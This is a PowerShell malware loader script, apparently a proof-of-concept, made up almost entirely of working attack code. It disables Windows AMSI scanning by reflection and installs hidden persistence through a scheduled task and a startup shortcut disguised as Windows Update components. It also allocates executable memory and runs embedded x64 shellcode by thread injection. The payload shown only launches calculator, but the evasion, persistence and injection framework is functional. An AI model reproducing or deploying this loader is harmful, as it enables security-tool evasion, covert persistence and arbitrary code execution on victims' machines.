# === DEBUG LOGGING SETUP ===
function Write-DebugLog {
    param([string]$Message)
    try {
        "$Message" | Out-File "C:\Users\Public\debug.txt" -Append
    } catch {}
}

"launcher.ps1 started" | Out-File "C:\Users\Public\debug.txt" -Append

try {
    # === SETUP ===
    $envData = Get-Item env:APPDATA
    $cachePath = Join-Path $envData.Value "Microsoft\Windows\Caches"
    if(!(Test-Path $cachePath)){New-Item -Path $cachePath -ItemType Directory -Force | Out-Null}
    
    # === AMSI BYPASS ===
    try {
        Write-DebugLog "Attempting AMSI bypass"
        $amsiContext = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
        $amsiContext.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
        Write-DebugLog "AMSI bypass successful"
    } catch {
        Write-DebugLog "AMSI bypass failed: $($_.Exception.Message)"
    }
    
    # === PERSISTENCE: Scheduled Task ===
    try {
        $taskName = "WindowsUpdateTask"
        $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if (-not $taskExists) {
            Write-DebugLog "Creating scheduled task"
            $trigger = New-ScheduledTaskTrigger -AtLogOn
            $scriptPath = Join-Path $cachePath "launcher.ps1"
            $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
            Write-DebugLog "Scheduled task created successfully"
        } else {
            Write-DebugLog "Scheduled task already exists"
        }
    } catch {
        Write-DebugLog "Failed to create scheduled task: $($_.Exception.Message)"
    }
    
    # === PERSISTENCE: Startup LNK ===
    try {
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
        if (-not (Test-Path $lnkPath)) {
            Write-DebugLog "Creating startup shortcut"
            $wshShell = New-Object -ComObject WScript.Shell
            $shortcut = $wshShell.CreateShortcut($lnkPath)
            $scriptPath = Join-Path $cachePath "launcher.ps1"
            $shortcut.TargetPath = "powershell.exe"
            $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
            $shortcut.WindowStyle = 7
            $shortcut.Save()
            Write-DebugLog "Startup shortcut created successfully"
        } else {
            Write-DebugLog "Startup shortcut already exists"
        }
    } catch {
        Write-DebugLog "Failed to create startup shortcut: $($_.Exception.Message)"
    }
    
    # === EMBEDDED CALC SHELLCODE (64-bit, 276 bytes) ===
    Write-DebugLog "Using embedded calc shellcode"
    $shellcodeBytes = @(
        0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
        0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,
        0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,
        0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,
        0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,
        0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,
        0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,
        0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,
        0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,
        0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,
        0x01,0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,
        0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,
        0x59,0x5A,0x48,0x8B,0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x48,0xBA,0x01,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x48,0x8D,0x8D,0x01,0x01,0x00,0x00,0x41,0xBA,0x31,0x8B,
        0x6F,0x87,0xFF,0xD5,0xBB,0xF0,0xB5,0xA2,0x56,0x41,0xBA,0xA6,0x95,0xBD,0x9D,0xFF,
        0xD5,0x48,0x83,0xC4,0x28,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,0x05,0xBB,0x47,
        0x13,0x72,0x6F,0x6A,0x00,0x59,0x41,0x89,0xDA,0xFF,0xD5,0x63,0x61,0x6C,0x63,0x2E,
        0x65,0x78,0x65,0x00
    )
    Write-DebugLog "Shellcode length: $($shellcodeBytes.Length) bytes"
    
    # === INJECT SHELLCODE ===
    try {
        Write-DebugLog "Starting shellcode injection"
        
        # Native methods for injection
        Write-DebugLog "Loading NativeMethods type definition"
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
}
"@
        Write-DebugLog "NativeMethods type loaded successfully"
        
        # Allocate memory with PAGE_EXECUTE_READWRITE
        Write-DebugLog "Calling VirtualAlloc with PAGE_EXECUTE_READWRITE"
        $memAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, [UInt32]$shellcodeBytes.Length, 0x3000, 0x40)
        $win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-DebugLog "VirtualAlloc result: 0x$($memAddress.ToString('X16')), Win32 error: $win32Error"
        
        if ($memAddress -eq [IntPtr]::Zero) {
            Write-DebugLog "ERROR: VirtualAlloc failed with Win32 error: $win32Error"
            throw "VirtualAlloc failed"
        }
        Write-DebugLog "Memory allocated successfully at: 0x$($memAddress.ToString('X16'))"
        
        # Copy shellcode
        [System.Runtime.InteropServices.Marshal]::Copy($shellcodeBytes, 0, $memAddress, $shellcodeBytes.Length)
        Write-DebugLog "Shellcode copied to memory"
        
        # Create thread
        $threadId = 0
        Write-DebugLog "Calling CreateThread to execute shellcode"
        $threadHandle = [NativeMethods]::CreateThread(0, 0, $memAddress, [IntPtr]::Zero, 0, [Ref]$threadId)
        $win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-DebugLog "CreateThread result: 0x$($threadHandle.ToString('X16')), Thread ID: $threadId, Win32 error: $win32Error"
        
        if ($threadHandle -eq [IntPtr]::Zero) {
            Write-DebugLog "ERROR: CreateThread failed with Win32 error: $win32Error"
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($memAddress)
            throw "CreateThread failed"
        }
        Write-DebugLog "Thread created successfully with ID: $threadId"
        Write-DebugLog "Shellcode execution initiated"
        
    } catch {
        Write-DebugLog "Shellcode injection failed: $($_.Exception.Message)"
    }
    
} catch {
    Write-DebugLog "Critical error: $($_.Exception.Message)"
}

# === FINAL LOG ===
Write-DebugLog "launcher.ps1 finished"
